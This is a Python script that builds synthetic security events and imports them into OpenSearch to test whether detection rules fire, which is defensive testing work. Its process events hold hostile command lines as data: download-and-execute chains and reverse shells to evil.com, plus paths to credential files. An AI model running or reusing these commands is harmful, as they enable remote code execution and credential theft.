#!/usr/bin/env python3
"""
创建能匹配现有规则的测试事件

功能：
1. 查询现有规则的条件
2. 根据规则条件创建匹配的测试事件
3. 确保事件能触发规则匹配
"""

import sys
from pathlib import Path
from datetime import datetime, timezone
import random

# 添加 backend 目录到路径，以便从 opensearch 包和 app 模块导入
# 脚本在 backend/app/services/opensearch/scripts/，需要回到 backend/ 才能导入 app 和 opensearch 包
backend_dir = Path(__file__).parent.parent.parent.parent.parent
sys.path.insert(0, str(backend_dir))

from app.services.opensearch.internal import get_client
from app.services.opensearch import store_events
from app.core.time import utc_now_rfc3339


def get_rules_for_detector(detector_type: str, limit: int = 10):
    """获取detector使用的规则详情"""
    client = get_client()
    
    try:
        # 查询detector
        detector_resp = client.transport.perform_request(
            'POST',
            '/_plugins/_security_analytics/detectors/_search',
            body={
                "query": {
                    "bool": {
                        "must": [
                            {"term": {"detector_type": detector_type}},
                            {"term": {"enabled": True}}
                        ]
                    }
                },
                "size": 1
            }
        )
        
        detector_hits = detector_resp.get('hits', {}).get('hits', [])
        if not detector_hits:
            return []
        
        detector = detector_hits[0].get('_source', {})
        inputs = detector.get('inputs', [])
        if not inputs:
            return []
        
        detector_input = inputs[0].get('detector_input', {})
        prepackaged = detector_input.get('pre_packaged_rules', [])
        custom = detector_input.get('custom_rules', [])
        
        # 查询规则详情
        rules = []
        for rule in (prepackaged + custom)[:limit]:
            rule_id = rule.get('id')
            if rule_id:
                try:
                    rule_resp = client.transport.perform_request(
                        'GET',
                        f'/_plugins/_security_analytics/rules/{rule_id}'
                    )
                    rule_data = rule_resp.get('rule', {})
                    rules.append(rule_data)
                except:
                    pass
        
        return rules
    except Exception as e:
        print(f"❌ 查询规则失败: {e}")
        return []


def analyze_rule_conditions(rules):
    """分析规则条件，提取关键字段"""
    conditions = {
        'dns_domains': set(),
        'process_names': set(),
        'command_patterns': set(),
        'network_patterns': set(),
        'file_paths': set(),
    }
    
    for rule in rules:
        title = rule.get('title', '').lower()
        description = rule.get('description', '').lower()
        
        # 从标题和描述中提取关键词
        if 'dns' in title or 'dns' in description:
            # DNS相关规则
            if 'cobalt' in title or 'cobalt' in description:
                conditions['dns_domains'].add('cobaltstrike.beacon.example.com')
            if 'beacon' in title or 'beacon' in description:
                conditions['dns_domains'].add('aaa.stage.example.com')
                conditions['dns_domains'].add('post.123.example.com')
            if 'suspicious' in title or 'suspicious' in description:
                conditions['dns_domains'].add('suspicious-domain.example.com')
        
        if 'powershell' in title or 'powershell' in description:
            conditions['process_names'].add('powershell.exe')
            conditions['command_patterns'].add('powershell.exe -EncodedCommand')
            conditions['command_patterns'].add('powershell.exe -nop -w hidden')
        
        if 'cmd' in title or 'cmd' in description:
            conditions['process_names'].add('cmd.exe')
            conditions['command_patterns'].add('cmd.exe /c')
        
        if 'network' in title or 'network' in description:
            if 'suspicious' in title or 'suspicious' in description:
                conditions['network_patterns'].add('suspicious')
    
    return conditions


def create_dns_event_matching_rules():
    """创建匹配DNS规则的DNS事件"""
    # 使用常见的可疑DNS域名（Cobalt Strike等）
    suspicious_domains = [
        'aaa.stage.example.com',  # Cobalt Strike DNS Beaconing
        'post.123.example.com',   # Cobalt Strike DNS Beaconing
        'test.stage.123456.com',  # Cobalt Strike DNS Beaconing
        'cobaltstrike.beacon.example.com',  # Cobalt Strike
        'suspicious-domain.example.com',
        'malicious.example.com',
    ]
    
    domain = random.choice(suspicious_domains)
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": utc_now_rfc3339(),
        "event": {
            "id": f"dns-event-{int(datetime.now(timezone.utc).timestamp() * 1000)}",
            "kind": "event",
            "category": ["network"],
            "type": ["connection"],
            "action": "dns_query",
            "dataset": "dns",
        },
        "dns": {
            "question": {
                "name": domain,
                "type": "A"
            },
            "answers": [
                {
                    "data": f"192.168.1.{random.randint(100, 200)}",
                    "type": "A"
                }
            ],
            "response_code": "NOERROR"
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"test-host-{random.randint(1, 5)}"
        },
        "source": {
            "ip": f"10.0.0.{random.randint(1, 255)}",
            "port": random.randint(49152, 65535)
        },
        "destination": {
            "ip": "8.8.8.8",
            "port": 53
        },
        "message": f"DNS query to {domain}"
    }


def create_network_event_matching_rules():
    """创建匹配Network规则的网络事件"""
    # 可疑的网络连接模式
    suspicious_ips = [
        "192.168.1.200",
        "10.0.0.100",
        "172.16.0.50",
    ]
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": utc_now_rfc3339(),
        "event": {
            "id": f"network-event-{int(datetime.now(timezone.utc).timestamp() * 1000)}",
            "kind": "event",
            "category": ["network"],
            "type": ["connection"],
            "action": "network_connection",
            "dataset": "network",
        },
        "source": {
            "ip": f"192.168.1.{random.randint(10, 50)}",
            "port": random.randint(4444, 5555)  # 可疑端口
        },
        "destination": {
            "ip": random.choice(suspicious_ips),
            "port": random.choice([8080, 443, 80, 4444]),
            "domain": random.choice([
                "suspicious-server.example.com",
                "malicious.example.com",
                "c2.example.com"
            ])
        },
        "network": {
            "protocol": "tcp",
            "transport": "tcp",
            "direction": "outbound"
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"test-host-{random.randint(1, 5)}"
        },
        "message": "Suspicious network connection"
    }


def create_windows_process_event_matching_rules():
    """创建匹配Windows规则的进程事件"""
    # 可疑的PowerShell命令
    suspicious_commands = [
        "powershell.exe -nop -w hidden -c whoami",
        "powershell.exe -EncodedCommand <base64>",
        "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
        "cmd.exe /c certutil -urlcache -split -f http://evil.com/malware.exe",
        "cmd.exe /c powershell.exe -nop -w hidden",
    ]
    
    command = random.choice(suspicious_commands)
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": utc_now_rfc3339(),
        "event": {
            "id": f"windows-process-event-{int(datetime.now(timezone.utc).timestamp() * 1000)}",
            "kind": "event",
            "category": ["process"],
            "type": ["start"],
            "action": "process_started",
            "dataset": "windows",
        },
        "process": {
            "entity_id": f"proc-{random.randint(1000, 9999)}",
            "pid": random.randint(1000, 9999),
            "name": "powershell.exe" if "powershell" in command.lower() else "cmd.exe",
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in command.lower() else "C:\\Windows\\System32\\cmd.exe",
            "command_line": command,
            "parent": {
                "pid": random.randint(100, 999),
                "name": random.choice(["cmd.exe", "explorer.exe", "svchost.exe"]),
                "executable": f"C:\\Windows\\System32\\{random.choice(['cmd.exe', 'explorer.exe', 'svchost.exe'])}",
                "command_line": random.choice(["cmd.exe", "explorer.exe"])
            }
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"test-host-{random.randint(1, 5)}",
            "os": {
                "family": "windows",
                "name": "Windows",
                "version": "10.0"
            }
        },
        "user": {
            "id": f"S-1-5-21-{random.randint(1000000000, 9999999999)}-{random.randint(1000, 9999)}",
            "name": random.choice(["testuser", "admin", "user"])
        },
        "message": f"Suspicious process execution: {command[:50]}"
    }


def create_linux_process_event_matching_rules():
    """创建匹配Linux规则的进程事件"""
    # 可疑的Linux命令
    suspicious_commands = [
        "bash -c 'curl http://suspicious-domain.com/malware.sh | sh'",
        "sh -c 'wget http://evil.com/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh'",
        "bash -c 'python -c import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "nc -e /bin/sh evil.com 4444",
        "python -c 'import os;os.system(\"bash -i >& /dev/tcp/evil.com/4444 0>&1\")'",
    ]
    
    command = random.choice(suspicious_commands)
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": utc_now_rfc3339(),
        "event": {
            "id": f"linux-process-event-{int(datetime.now(timezone.utc).timestamp() * 1000)}",
            "kind": "event",
            "category": ["process"],
            "type": ["start"],
            "action": "process_started",
            "dataset": "linux",
        },
        "process": {
            "entity_id": f"proc-{random.randint(1000, 9999)}",
            "pid": random.randint(1000, 9999),
            "name": random.choice(["bash", "sh", "python", "nc", "netcat"]),
            "executable": random.choice(["/bin/bash", "/bin/sh", "/usr/bin/python", "/bin/nc"]),
            "command_line": command,
            "parent": {
                "pid": random.randint(100, 999),
                "name": "sh",
                "executable": "/bin/sh",
                "command_line": "sh"
            }
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"linux-host-{random.randint(1, 5)}",
            "os": {
                "family": "linux",
                "name": "Ubuntu",
                "version": "20.04"
            }
        },
        "user": {
            "id": str(random.randint(1000, 9999)),
            "name": random.choice(["testuser", "root", "user"])
        },
        "message": f"Suspicious Linux command execution: {command[:50]}"
    }


def create_windows_file_event():
    """创建Windows文件操作事件"""
    suspicious_paths = [
        "C:\\Windows\\Temp\\malware.exe",
        "C:\\Users\\Public\\payload.dll",
        "C:\\ProgramData\\suspicious.bat",
        "C:\\Windows\\System32\\config\\sam",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
    
    file_path = random.choice(suspicious_paths)
    file_actions = ["created", "modified", "deleted", "accessed"]
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": utc_now_rfc3339(),
        "event": {
            "id": f"windows-file-event-{int(datetime.now(timezone.utc).timestamp() * 1000)}",
            "kind": "event",
            "category": ["file"],
            "type": ["change"],
            "action": random.choice(file_actions),
            "dataset": "windows",
        },
        "file": {
            "path": file_path,
            "name": file_path.split("\\")[-1],
            "extension": file_path.split(".")[-1] if "." in file_path else "",
            "hash": {
                "sha256": "".join([random.choice("0123456789abcdef") for _ in range(64)])
            }
        },
        "process": {
            "entity_id": f"proc-{random.randint(1000, 9999)}",
            "pid": random.randint(1000, 9999),
            "name": random.choice(["powershell.exe", "cmd.exe", "explorer.exe"]),
            "executable": f"C:\\Windows\\System32\\{random.choice(['powershell.exe', 'cmd.exe', 'explorer.exe'])}",
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"windows-host-{random.randint(1, 5)}",
            "os": {
                "family": "windows",
                "name": "Windows",
                "version": "10.0"
            }
        },
        "user": {
            "name": random.choice(["testuser", "admin", "SYSTEM"])
        },
        "message": f"Suspicious file {random.choice(file_actions)}: {file_path}"
    }


def create_linux_file_event():
    """创建Linux文件操作事件"""
    suspicious_paths = [
        "/tmp/malware.sh",
        "/var/tmp/payload",
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh/authorized_keys",
        "/usr/bin/suspicious",
    ]
    
    file_path = random.choice(suspicious_paths)
    file_actions = ["created", "modified", "deleted", "accessed"]
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": utc_now_rfc3339(),
        "event": {
            "id": f"linux-file-event-{int(datetime.now(timezone.utc).timestamp() * 1000)}",
            "kind": "event",
            "category": ["file"],
            "type": ["change"],
            "action": random.choice(file_actions),
            "dataset": "linux",
        },
        "file": {
            "path": file_path,
            "name": file_path.split("/")[-1],
            "extension": file_path.split(".")[-1] if "." in file_path else "",
            "hash": {
                "sha256": "".join([random.choice("0123456789abcdef") for _ in range(64)])
            }
        },
        "process": {
            "entity_id": f"proc-{random.randint(1000, 9999)}",
            "pid": random.randint(1000, 9999),
            "name": random.choice(["bash", "sh", "python"]),
            "executable": random.choice(["/bin/bash", "/bin/sh", "/usr/bin/python"]),
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"linux-host-{random.randint(1, 5)}",
            "os": {
                "family": "linux",
                "name": "Ubuntu",
                "version": "20.04"
            }
        },
        "user": {
            "name": random.choice(["testuser", "root", "user"])
        },
        "message": f"Suspicious file {random.choice(file_actions)}: {file_path}"
    }


def create_authentication_event():
    """创建认证事件（登录失败、异常登录等）"""
    auth_types = ["user_login", "user_logout", "authentication_failure", "privilege_escalation"]
    auth_type = random.choice(auth_types)
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": utc_now_rfc3339(),
        "event": {
            "id": f"auth-event-{int(datetime.now(timezone.utc).timestamp() * 1000)}",
            "kind": "event",
            "category": ["authentication"],
            "type": ["authentication_info" if "failure" not in auth_type else "authentication_failure"],
            "action": auth_type,
            "outcome": "failure" if "failure" in auth_type else "success",
            "dataset": random.choice(["windows", "linux"]),
        },
        "user": {
            "id": f"S-1-5-21-{random.randint(1000000000, 9999999999)}-{random.randint(1000, 9999)}" if random.random() > 0.5 else str(random.randint(1000, 9999)),
            "name": random.choice(["testuser", "admin", "guest", "attacker"]),
            "domain": random.choice(["WORKGROUP", "DOMAIN", None]),
        },
        "source": {
            "ip": f"192.168.1.{random.randint(1, 255)}",
            "port": random.randint(49152, 65535)
        },
        "destination": {
            "ip": f"10.0.0.{random.randint(1, 255)}",
            "port": random.choice([22, 3389, 445, 5985])
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"{random.choice(['windows', 'linux'])}-host-{random.randint(1, 5)}",
            "os": {
                "family": random.choice(["windows", "linux"]),
                "name": random.choice(["Windows", "Ubuntu"]),
            }
        },
        "message": f"Authentication event: {auth_type}"
    }


def create_http_event():
    """创建HTTP/HTTPS网络事件"""
    suspicious_urls = [
        "http://evil.com/malware.exe",
        "https://suspicious-domain.com/payload.php",
        "http://192.168.1.200/backdoor",
        "https://c2.example.com/beacon",
    ]
    
    url = random.choice(suspicious_urls)
    method = random.choice(["GET", "POST", "PUT"])
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": utc_now_rfc3339(),
        "event": {
            "id": f"http-event-{int(datetime.now(timezone.utc).timestamp() * 1000)}",
            "kind": "event",
            "category": ["network"],
            "type": ["connection"],
            "action": "http_request",
            "dataset": "network",
        },
        "http": {
            "request": {
                "method": method,
                "referrer": random.choice(["http://example.com", None]),
            },
            "response": {
                "status_code": random.choice([200, 404, 403, 500]),
            }
        },
        "url": {
            "original": url,
            "domain": url.split("//")[1].split("/")[0] if "//" in url else "",
            "path": "/" + "/".join(url.split("/")[3:]) if len(url.split("/")) > 3 else "/",
        },
        "source": {
            "ip": f"192.168.1.{random.randint(1, 255)}",
            "port": random.randint(49152, 65535)
        },
        "destination": {
            "ip": f"10.0.0.{random.randint(1, 255)}",
            "port": random.choice([80, 443, 8080])
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"host-{random.randint(1, 5)}"
        },
        "message": f"HTTP {method} request to {url}"
    }


def create_registry_event():
    """创建Windows注册表事件"""
    registry_paths = [
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services",
    ]
    
    registry_path = random.choice(registry_paths)
    registry_actions = ["created", "modified", "deleted"]
    
    return {
        "ecs": {"version": "9.2.0"},
        "@timestamp": utc_now_rfc3339(),
        "event": {
            "id": f"registry-event-{int(datetime.now(timezone.utc).timestamp() * 1000)}",
            "kind": "event",
            "category": ["registry"],
            "type": ["change"],
            "action": random.choice(registry_actions),
            "dataset": "windows",
        },
        "registry": {
            "path": registry_path,
            "key": registry_path.split("\\")[-1],
            "value": random.choice(["malware.exe", "suspicious.dll", "backdoor.bat"]),
        },
        "process": {
            "entity_id": f"proc-{random.randint(1000, 9999)}",
            "pid": random.randint(1000, 9999),
            "name": random.choice(["reg.exe", "powershell.exe", "cmd.exe"]),
            "executable": f"C:\\Windows\\System32\\{random.choice(['reg.exe', 'powershell.exe', 'cmd.exe'])}",
        },
        "host": {
            "id": f"h-test-{random.randint(1, 5)}",
            "name": f"windows-host-{random.randint(1, 5)}",
            "os": {
                "family": "windows",
                "name": "Windows",
                "version": "10.0"
            }
        },
        "user": {
            "name": random.choice(["testuser", "admin", "SYSTEM"])
        },
        "message": f"Registry {random.choice(registry_actions)}: {registry_path}"
    }


def main():
    """主函数"""
    import argparse
    
    parser = argparse.ArgumentParser(description="创建匹配现有规则的测试事件")
    parser.add_argument(
        "--count",
        type=int,
        default=50,
        help="每种类型创建的事件数量（默认：50）"
    )
    args = parser.parse_args()
    
    print("=" * 100)
    print("创建匹配现有规则的测试事件")
    print("=" * 100)
    
    # 创建多种类型的匹配事件
    events = []
    
    # 计算每种类型的数量
    dns_count = args.count // 8
    network_count = args.count // 8
    http_count = args.count // 8
    windows_process_count = args.count // 6
    linux_process_count = args.count // 6
    windows_file_count = args.count // 10
    linux_file_count = args.count // 10
    auth_count = args.count // 10
    registry_count = args.count // 10
    
    print(f"\n[1] 创建DNS事件（匹配DNS规则）...")
    for _ in range(dns_count):
        events.append(create_dns_event_matching_rules())
    print(f"  ✅ 创建了 {dns_count} 个DNS事件")
    
    print(f"\n[2] 创建Network事件（匹配Network规则）...")
    for _ in range(network_count):
        events.append(create_network_event_matching_rules())
    print(f"  ✅ 创建了 {network_count} 个Network事件")
    
    print(f"\n[3] 创建HTTP事件（匹配Network规则）...")
    for _ in range(http_count):
        events.append(create_http_event())
    print(f"  ✅ 创建了 {http_count} 个HTTP事件")
    
    print(f"\n[4] 创建Windows Process事件（匹配Windows规则）...")
    for _ in range(windows_process_count):
        events.append(create_windows_process_event_matching_rules())
    print(f"  ✅ 创建了 {windows_process_count} 个Windows进程事件")
    
    print(f"\n[5] 创建Linux Process事件（匹配Linux规则）...")
    for _ in range(linux_process_count):
        events.append(create_linux_process_event_matching_rules())
    print(f"  ✅ 创建了 {linux_process_count} 个Linux进程事件")
    
    print(f"\n[6] 创建Windows File事件（匹配Windows规则）...")
    for _ in range(windows_file_count):
        events.append(create_windows_file_event())
    print(f"  ✅ 创建了 {windows_file_count} 个Windows文件事件")
    
    print(f"\n[7] 创建Linux File事件（匹配Linux规则）...")
    for _ in range(linux_file_count):
        events.append(create_linux_file_event())
    print(f"  ✅ 创建了 {linux_file_count} 个Linux文件事件")
    
    print(f"\n[8] 创建Authentication事件（匹配认证规则）...")
    for _ in range(auth_count):
        events.append(create_authentication_event())
    print(f"  ✅ 创建了 {auth_count} 个认证事件")
    
    print(f"\n[9] 创建Registry事件（匹配Windows规则）...")
    for _ in range(registry_count):
        events.append(create_registry_event())
    print(f"  ✅ 创建了 {registry_count} 个注册表事件")
    
    print(f"\n总共创建了 {len(events)} 个测试事件")
    
    # 显示事件摘要
    print("\n事件摘要:")
    dns_actual = sum(1 for e in events if 'dns' in e.get('event', {}).get('dataset', ''))
    network_actual = sum(1 for e in events if e.get('event', {}).get('dataset') == 'network' and 'http' not in str(e.get('event', {}).get('action', '')).lower())
    http_actual = sum(1 for e in events if 'http' in str(e.get('event', {}).get('action', '')).lower() or e.get('http'))
    windows_process_actual = sum(1 for e in events if e.get('event', {}).get('dataset') == 'windows' and 'process' in e.get('event', {}).get('category', []))
    linux_process_actual = sum(1 for e in events if e.get('event', {}).get('dataset') == 'linux' and 'process' in e.get('event', {}).get('category', []))
    windows_file_actual = sum(1 for e in events if e.get('event', {}).get('dataset') == 'windows' and 'file' in e.get('event', {}).get('category', []))
    linux_file_actual = sum(1 for e in events if e.get('event', {}).get('dataset') == 'linux' and 'file' in e.get('event', {}).get('category', []))
    auth_actual = sum(1 for e in events if 'authentication' in e.get('event', {}).get('category', []))
    registry_actual = sum(1 for e in events if 'registry' in e.get('event', {}).get('category', []))
    
    print(f"  - DNS事件: {dns_actual} 个")
    print(f"  - Network事件: {network_actual} 个")
    print(f"  - HTTP事件: {http_actual} 个")
    print(f"  - Windows进程事件: {windows_process_actual} 个")
    print(f"  - Linux进程事件: {linux_process_actual} 个")
    print(f"  - Windows文件事件: {windows_file_actual} 个")
    print(f"  - Linux文件事件: {linux_file_actual} 个")
    print(f"  - 认证事件: {auth_actual} 个")
    print(f"  - 注册表事件: {registry_actual} 个")
    
    # 导入到OpenSearch
    print(f"\n导入到OpenSearch...")
    try:
        result = store_events(events)
        
        print(f"\n导入结果:")
        print(f"  成功: {result.get('success', 0)}")
        print(f"  失败: {result.get('failed', 0)}")
        print(f"  重复: {result.get('duplicated', 0)}")
        
        if result.get('success', 0) > 0:
            print(f"\n✅ 成功导入 {result.get('success')} 个事件")
            
            # 显示创建的数据示例
            print("\n" + "=" * 100)
            print("创建的事件数据示例（每种类型显示1个）")
            print("=" * 100)
            
            import json
            shown_types = set()
            
            for i, event in enumerate(events[:20]):  # 最多显示20个示例
                event_type = event.get('event', {}).get('dataset', 'unknown')
                event_category = event.get('event', {}).get('category', [])
                category_str = ', '.join(event_category) if isinstance(event_category, list) else str(event_category)
                
                # 每种类型只显示一个
                type_key = f"{event_type}_{category_str}"
                if type_key in shown_types:
                    continue
                shown_types.add(type_key)
                
                print(f"\n[{len(shown_types)}] {event_type.upper()} - {category_str}")
                print("-" * 100)
                
                # 显示关键字段
                event_id = event.get('event', {}).get('id', 'N/A')
                timestamp = event.get('@timestamp', 'N/A')
                
                # 解析时间戳并显示本地时间
                from app.core.time import parse_datetime
                dt = parse_datetime(timestamp)
                if dt:
                    local_time = dt.astimezone().strftime("%Y-%m-%d %H:%M:%S")
                    print(f"  Event ID: {event_id}")
                    print(f"  时间戳 (UTC): {timestamp}")
                    print(f"  时间戳 (本地): {local_time}")
                else:
                    print(f"  Event ID: {event_id}")
                    print(f"  时间戳: {timestamp}")
                
                # 根据类型显示特定字段
                if 'dns' in event_type.lower():
                    dns_q = event.get('dns', {}).get('question', {})
                    print(f"  DNS查询: {dns_q.get('name', 'N/A')}")
                elif 'process' in category_str.lower():
                    proc = event.get('process', {})
                    print(f"  进程: {proc.get('name', 'N/A')}")
                    print(f"  命令行: {proc.get('command_line', 'N/A')[:80]}...")
                elif 'file' in category_str.lower():
                    file_path = event.get('file', {}).get('path', 'N/A')
                    print(f"  文件路径: {file_path}")
                elif 'network' in category_str.lower() or 'http' in str(event.get('event', {}).get('action', '')).lower():
                    source = event.get('source', {})
                    dest = event.get('destination', {})
                    print(f"  源: {source.get('ip', 'N/A')}:{source.get('port', 'N/A')}")
                    print(f"  目标: {dest.get('ip', 'N/A')}:{dest.get('port', 'N/A')}")
                    if event.get('http'):
                        print(f"  HTTP方法: {event.get('http', {}).get('request', {}).get('method', 'N/A')}")
                elif 'authentication' in category_str.lower():
                    user = event.get('user', {})
                    outcome = event.get('event', {}).get('outcome', 'N/A')
                    print(f"  用户: {user.get('name', 'N/A')}")
                    print(f"  结果: {outcome}")
                elif 'registry' in category_str.lower():
                    reg = event.get('registry', {})
                    print(f"  注册表路径: {reg.get('path', 'N/A')}")
                
                # 显示完整JSON（格式化，但限制长度）
                event_json = json.dumps(event, ensure_ascii=False, indent=2)
                if len(event_json) > 500:
                    print(f"\n  完整数据（前500字符）:")
                    print(f"  {event_json[:500]}...")
                else:
                    print(f"\n  完整数据:")
                    for line in event_json.split('\n'):
                        print(f"  {line}")
                
                # 最多显示10个不同类型的示例
                if len(shown_types) >= 10:
                    break
            
            print("\n" + "=" * 100)
            print(f"\n现在可以运行检测:")
            print(f"  cd backend/app/services/opensearch/scripts")
            print(f"  uv run python run_analysis_direct.py --analysis")
            print(f"\n这些事件应该能匹配到规则并生成findings！")
        else:
            print(f"\n❌ 导入失败")
            return 1
        
        return 0
        
    except Exception as e:
        print(f"\n❌ 导入失败: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
